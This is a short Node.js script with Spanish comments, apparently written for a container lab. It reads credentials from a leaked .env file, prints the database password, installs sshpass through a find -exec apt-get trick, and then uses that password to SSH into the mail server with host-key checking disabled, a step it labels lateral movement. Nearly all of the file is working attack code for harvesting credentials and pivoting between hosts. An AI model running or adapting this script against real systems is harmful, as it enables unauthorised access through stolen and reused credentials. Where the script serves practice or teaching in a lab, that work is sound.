const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

console.log("=== Paso 1: Leyendo credenciales e infraestructura de .env filtrado ===");
const envPath = path.join(__dirname, '..', 'src', '.env');
const envContent = fs.readFileSync(envPath, 'utf8');

const env = {};
envContent.split('\n').forEach(line => {
    const parts = line.split('=');
    if (parts.length === 2) {
        env[parts[0].trim()] = parts[1].trim();
    }
});

const mailUser = env['MAIL_USER'];
const mailHost = env['MAIL_HOST'];
const dbPassword = env['DB_PASSWORD'];

console.log(`[INFO] Objetivo detectado: ${mailUser}@${mailHost}`);
console.log(`[INFO] Contraseña recuperada: ${dbPassword}\n`);

console.log("=== Paso 2: Instalando herramientas necesarias (SSH & sshpass) ===");
try {
    // Si ya está instalado, este comando terminará de inmediato
    execSync('find . -exec apt-get update \\; -exec apt-get install -y sshpass openssh-client \\; -quit');
    console.log("[OK] Herramientas instaladas con éxito.\n");
} catch (e) {
    console.log("[ERROR] No se pudo instalar:", e.message);
}

console.log("=== Paso 3: Ejecutando Movimiento Lateral por SSH ===");
try {
    // IMPORTANTE: Se añade "-p 2222" al comando ssh para conectarse al puerto correcto del contenedor
    const cmd = `sshpass -p "${dbPassword}" ssh -p 2222 -o StrictHostKeyChecking=no ${mailUser}@${mailHost} "whoami; hostname"`;

    const output = execSync(cmd).toString();
    console.log("[CONEXIÓN EXITOSA] Datos del Servidor de Correo:\n");
    console.log(output);
} catch (e) {
    console.log("[ERROR de Conexión]:", e.message);
}
